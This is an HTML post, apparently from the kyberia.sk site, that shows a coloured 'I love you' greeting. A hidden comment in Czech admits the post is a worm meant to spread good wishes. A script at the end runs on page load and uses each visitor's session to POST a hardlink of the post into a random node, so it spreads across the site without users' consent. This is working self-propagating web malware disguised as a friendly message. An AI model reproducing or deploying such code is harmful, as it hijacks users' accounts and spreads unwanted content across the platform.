I <font color="red">love</font> YOU and i <font color="yellow">wish</font> YOU the greatest <font color="lime">happiness!</font>

<!--

Ano spravne. Toto je virus. Neni ale zas tak skodlivy, jak se muze zdat.
Jeho primarnim ucelem je sirit dobre prani v pisemne podobe pres celou kyberii.
Ve chvili, kdy se zacne prilis rozmahat, bude autorem odstranen.
Jak je videt z kodu - nekopiruje se, ale pouze se hardlinkuje, jeho sireni i veskera existence se da tedy zrusit odstranenim jedine nody s id 4499197.
Sireni cerva lze sledovat na https://kyberia.sk/id/4499197/1961036
Doufam, ze existence tohoto cerva bude kyberiany pochopena tak jak byl zamyslena: Dodat virum novy rozmer a zamerit se na splynuti pocitacu a prirody. Samozrejme take poprat vsem kyberanum stesti na jejich ceste. Pokud by nekoho po tu periodu sve existence cerv obtezoval, tak se predem omlouvam.

THX: Joa javascript neumim a nemam ho rad, takze bych rad podekoval temto trema strankam, ktere staci k tomu, aby nekdo napsal neco podobneho:
- https://kyberia.sk/id/4346119 (by id juraj)
- http://nb.vse.cz/~zelenyj/it380/eseje/xdemm06/ajax.htm
- http://www.javascriptkit.com/javatutors/randomnum.shtml

<~~Harvie (cerv vypusten 8.2. 2oo9 - 23:00:00)

-->

<script type="text/javascript" language="javascript">
  var http_request = false;

  function makeRequest() {

    http_request = false;

    if (window.XMLHttpRequest) { // Mozilla, Safari,...
      http_request = new XMLHttpRequest();
    } else if (window.ActiveXObject) { // IE
      try {
        http_request = new ActiveXObject("Msxml2.XMLHTTP");
      } catch (e) {
        try {
          http_request = new ActiveXObject("Microsoft.XMLHTTP");
        } catch (e) {}
      }
    }
    
    if (!http_request) {
      return false;
    }

    //http_request.onreadystatechange = alertContents;
    http_request.open('POST', '/id/4499197', true); //co
    http_request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    //http_request.send('event=put&nodeshell_id=4390629'); //kam (debug)
    http_request.send( 'event=put&nodeshell_id='+Math.floor(Math.random()*9999999) ); //kam (random!)
    
 }

 makeRequest();
</script>
